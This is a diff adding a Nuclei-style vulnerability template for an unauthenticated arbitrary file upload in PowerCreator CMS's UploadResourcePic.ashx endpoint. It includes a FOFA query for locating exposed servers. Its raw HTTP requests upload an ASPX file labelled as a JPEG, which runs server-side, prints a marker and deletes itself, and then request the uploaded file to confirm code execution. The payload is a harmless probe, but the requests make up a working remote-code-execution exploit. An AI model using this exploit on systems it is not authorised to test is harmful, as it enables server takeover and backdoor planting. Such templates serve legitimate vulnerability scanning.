@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+
+          -----------------------------20873900192357278038549710136
+          Content-Disposition: form-data; name="file1"; filename="qaz.aspx"
+          Content-Type: image/jpeg
+
+          <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+          -----------------------------20873900192357278038549710136--
+        - |
+          GET /ResourcePic/ODM4Mg==.ASPX HTTP/1.1
+          Host: {{Hostname}}
+id: PowerCreatorCMS-UploadResourcePic-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: app="PowerCreator-CMS"
+        PowerCreatorCMS UploadResourcePic 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: PowerCreatorCMS UploadResourcePic 任意文件上传漏洞复现
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/140487417
+    severity: high
+    tags: []
